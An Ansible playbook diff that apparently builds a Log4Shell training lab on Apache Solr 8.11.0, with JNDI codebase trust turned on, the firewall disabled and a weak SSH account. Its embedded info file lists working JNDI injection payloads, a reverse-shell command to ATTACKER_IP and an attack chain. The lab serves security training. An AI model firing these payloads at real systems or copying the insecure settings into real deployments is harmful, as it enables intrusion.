@@ -1,0 +1,326 @@
+---
+- name: Deploy Log4Shell (CVE-2021-44228) Lab via Apache Solr
+  hosts: log4shell_vm
+  become: yes
+
+  vars:
+    solr_version: "8.11.0"
+    solr_home: "/opt/solr"
+    solr_data: "/var/solr"
+    solr_port: 8983
+
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Install Java 11
+      apt:
+        name: openjdk-11-jdk
+        state: present
+
+    - name: Find Java 11 home directory
+      shell: dirname $(dirname $(readlink -f $(which java)))
+      register: java_home_result
+      changed_when: false
+
+    - name: Set Java home fact
+      set_fact:
+        java_home_path: "{{ java_home_result.stdout }}"
+
+    - name: Display Java home
+      debug:
+        msg: "Java home: {{ java_home_path }}"
+
+    - name: Create solr group
+      group:
+        name: solr
+        state: present
+
+    - name: Create solr user
+      user:
+        name: solr
+        group: solr
+        home: "{{ solr_home }}"
+        system: yes
+        shell: /bin/bash
+        create_home: no
+
+    - name: Create Solr directories
+      file:
+        path: "{{ item }}"
+        state: directory
+        owner: solr
+        group: solr
+        mode: '0755'
+      loop:
+        - "{{ solr_home }}"
+        - "{{ solr_data }}"
+        - "{{ solr_data }}/data"
+        - /var/log/solr
+
+    - name: Download Apache Solr {{ solr_version }}
+      get_url:
+        url: "https://archive.apache.org/dist/lucene/solr/{{ solr_version }}/solr-{{ solr_version }}.tgz"
+        dest: "/tmp/solr-{{ solr_version }}.tgz"
+        timeout: 180
+
+    - name: Extract Solr to {{ solr_home }}
+      unarchive:
+        src: "/tmp/solr-{{ solr_version }}.tgz"
+        dest: "{{ solr_home }}"
+        remote_src: yes
+        extra_opts: [--strip-components=1]
+        owner: solr
+        group: solr
+        creates: "{{ solr_home }}/bin/solr"
+
+    - name: Create Solr environment configuration file
+      copy:
+        dest: /etc/default/solr.in.sh
+        content: |
+          SOLR_PID_DIR="{{ solr_data }}"
+          SOLR_HOME="{{ solr_data }}/data"
+          LOG4J_PROPS="{{ solr_home }}/server/resources/log4j2.xml"
+          SOLR_LOGS_DIR="/var/log/solr"
+          SOLR_PORT="{{ solr_port }}"
+          JAVA_HOME="{{ java_home_path }}"
+          SOLR_JAVA_MEM="-Xms512m -Xmx1024m"
+          SOLR_HOST="{{ ansible_default_ipv4.address }}"
+        owner: solr
+        group: solr
+        mode: '0644'
+
+    - name: Create Solr systemd service
+      copy:
+        dest: /etc/systemd/system/solr.service
+        content: |
+          [Unit]
+          Description=Apache Solr 8.11.0 (Log4Shell Lab)
+          After=network.target
+
+          [Service]
+          Type=simple
+          User=solr
+          Group=solr
+          Environment="JAVA_HOME={{ java_home_path }}"
+          Environment="SOLR_PID_DIR={{ solr_data }}"
+          Environment="SOLR_HOME={{ solr_data }}/data"
+          Environment="SOLR_LOGS_DIR=/var/log/solr"
+          Environment="SOLR_JAVA_MEM=-Xms512m -Xmx1024m"
+
+          ExecStart={{ solr_home }}/bin/solr start -f -p {{ solr_port }} -s {{ solr_data }}/data -a "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dcom.sun.jndi.rmi.object.trustURLCodebase=true"
+          ExecStop={{ solr_home }}/bin/solr stop -p {{ solr_port }}
+
+          TimeoutStartSec=180
+          Restart=on-failure
+          RestartSec=10
+
+          [Install]
+          WantedBy=multi-user.target
+        mode: '0644'
+
+    - name: Copy default solr.xml to SOLR_HOME (required for Solr to recognise the home directory)
+      copy:
+        src: "{{ solr_home }}/server/solr/solr.xml"
+        dest: "{{ solr_data }}/data/solr.xml"
+        remote_src: yes
+        owner: solr
+        group: solr
+        mode: '0644'
+
+    - name: Remove stale Solr PID file if present from previous run
+      file:
+        path: "{{ solr_data }}/solr-{{ solr_port }}.pid"
+        state: absent
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start Solr service
+      systemd:
+        name: solr
+        state: restarted
+        enabled: yes
+
+    - name: Wait for Solr to start on port {{ solr_port }}
+      wait_for:
+        port: "{{ solr_port }}"
+        delay: 15
+        timeout: 180
+      register: solr_wait
+      ignore_errors: yes
+
+    - name: Capture Solr logs if startup failed
+      shell: "journalctl -u solr -n 50 --no-pager"
+      register: solr_journal
+      when: solr_wait is failed
+
+    - name: Show Solr journal output
+      debug:
+        msg: "{{ solr_journal.stdout_lines }}"
+      when: solr_wait is failed
+
+    - name: Fail with helpful message if Solr did not start
+      fail:
+        msg: "Solr did not bind to port {{ solr_port }} within 180s. See journal output above."
+      when: solr_wait is failed
+
+    - name: Create demo search core
+      become_user: solr
+      shell: "{{ solr_home }}/bin/solr create_core -c demo -p {{ solr_port }}"
+      environment:
+        JAVA_HOME: "{{ java_home_path }}"
+      register: core_result
+      failed_when: core_result.rc != 0 and 'already exists' not in (core_result.stdout | default(''))
+      changed_when: "'Created new core' in (core_result.stdout | default(''))"
+
+    - name: Create test user account
+      shell: |
+        if ! id solruser >/dev/null 2>&1; then
+          useradd -m -s /bin/bash solruser
+        fi
+        echo 'solruser:solr123' | chpasswd
+      args:
+        executable: /bin/bash
+
+    - name: Disable firewall
+      ufw:
+        state: disabled
+
+    - name: Get target IP address
+      set_fact:
+        target_ip: "{{ ansible_default_ipv4.address }}"
+
+    - name: Create info file
+      copy:
+        dest: /root/TARGET_INFO.txt
+        content: |
+          ===================================================
+          LOG4SHELL (CVE-2021-44228) LAB
+          ===================================================
+
+          Service: Apache Solr {{ solr_version }}
+          Vulnerability: Log4Shell - Log4j2 JNDI Injection RCE
+          Log4j Version: 2.14.1 (bundled with Solr 8.11.0, vulnerable)
+          CVE: CVE-2021-44228
+          CVSS Score: 10.0 (Critical)
+          Port: {{ solr_port }}
+
+          Solr Admin UI: http://{{ target_ip }}:{{ solr_port }}/solr/
+          Demo Core:    http://{{ target_ip }}:{{ solr_port }}/solr/demo/
+
+          ===================================================
+          VULNERABILITY OVERVIEW
+          ===================================================
+
+          Log4j2 versions 2.0-beta9 through 2.14.1 perform JNDI lookups
+          on user-controlled log messages. A payload like:
+            ${jndi:ldap://attacker/a}
+          causes the server to make an outbound LDAP/RMI request to the
+          attacker's server, allowing arbitrary Java code execution.
+
+          ===================================================
+          DETECTION
+          ===================================================
+
+          # Nmap service detection
+          nmap -sV -p {{ solr_port }} {{ target_ip }}
+
+          # Verify Solr version (reveals Log4j version)
+          curl http://{{ target_ip }}:{{ solr_port }}/solr/admin/info/system?wt=json
+
+          ===================================================
+          ATTACK SETUP (on attacker machine)
+          ===================================================
+
+          # Option A: Use JNDI-Exploit-Kit (recommended for ease of use)
+          git clone https://github.com/pimps/JNDI-Exploit-Kit
+          cd JNDI-Exploit-Kit
+          mvn clean package -DskipTests
+          java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
+            -C "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
+            -A ATTACKER_IP
+
+          # Option B: Use marshalsec + manual class hosting
+          # Step 1: Create malicious Java class (Exploit.java)
+          #   public class Exploit {
+          #     static { try { Runtime.getRuntime().exec("..."); } catch(Exception e){} }
+          #   }
+          # Step 2: Compile: javac Exploit.java
+          # Step 3: Host it: python3 -m http.server 8888
+          # Step 4: Start LDAP referral server (marshalsec):
+          java -cp marshalsec-*-all.jar marshalsec.jndi.LDAPRefServer \
+            "http://ATTACKER_IP:8888/#Exploit" 1389
+
+          ===================================================
+          EXPLOIT PAYLOADS
+          ===================================================
+
+          # Method 1: Inject via Solr search query parameter
+          curl "http://{{ target_ip }}:{{ solr_port }}/solr/demo/select?q=\${jndi:ldap://ATTACKER_IP:1389/a}"
+
+          # Method 2: Inject via Solr admin API
+          curl "http://{{ target_ip }}:{{ solr_port }}/solr/admin/cores?action=\${jndi:ldap://ATTACKER_IP:1389/a}"
+
+          # Method 3: Inject via User-Agent header (also logged by Log4j)
+          curl -H "User-Agent: \${jndi:ldap://ATTACKER_IP:1389/a}" \
+            http://{{ target_ip }}:{{ solr_port }}/solr/
+
+          # DNS callback test (use interactsh or Burp Collaborator to verify OOB)
+          curl "http://{{ target_ip }}:{{ solr_port }}/solr/demo/select?q=\${jndi:dns://YOUR-COLLABORATOR-DOMAIN/a}"
+
+          ===================================================
+          SERVICE MANAGEMENT
+          ===================================================
+
+          systemctl status solr
+          tail -f /var/log/solr/solr.log
+          sudo -u solr /opt/solr/bin/solr status
+
+          ===================================================
+          CREDENTIALS
+          ===================================================
+
+          SSH User: solruser
+          Password: solr123
+
+          ===================================================
+          ATTACK CHAIN EXAMPLE
+          ===================================================
+
+          1. Initial Recon:    Discover Solr on port 8983
+          2. Version Check:    Confirm Log4j 2.14.1 via admin API
+          3. Setup:            Start JNDI-Exploit-Kit on attacker
+          4. Trigger:          Send JNDI payload in search query
+          5. Callback:         Solr fetches malicious class from attacker
+          6. RCE:              Execute arbitrary commands as solr user
+          7. Escalate:         Check sudo rights, local exploits
+
+          ===================================================
+        mode: '0644'
+
+    - name: Display completion message
+      debug:
+        msg:
+          - "========================================================="
+          - "Log4Shell Lab deployed successfully!"
+          - "========================================================="
+          - "Solr Admin UI: http://{{ target_ip }}:{{ solr_port }}/solr/"
+          - "Java Home:     {{ java_home_path }}"
+          - "CVE:           CVE-2021-44228 (Log4Shell)"
+          - "Log4j Version: 2.14.1 (vulnerable)"
+          - ""
+          - "Quick verify:"
+          - "  curl http://{{ target_ip }}:{{ solr_port }}/solr/admin/ping"
+          - ""
+          - "SSH access:"
+          - "  ssh solruser@{{ target_ip }}"
+          - "  Password: solr123"
+          - ""
+          - "Service management:"
+          - "  sudo systemctl status solr"
+          - "  sudo tail -f /var/log/solr/solr.log"
+          - "========================================================="
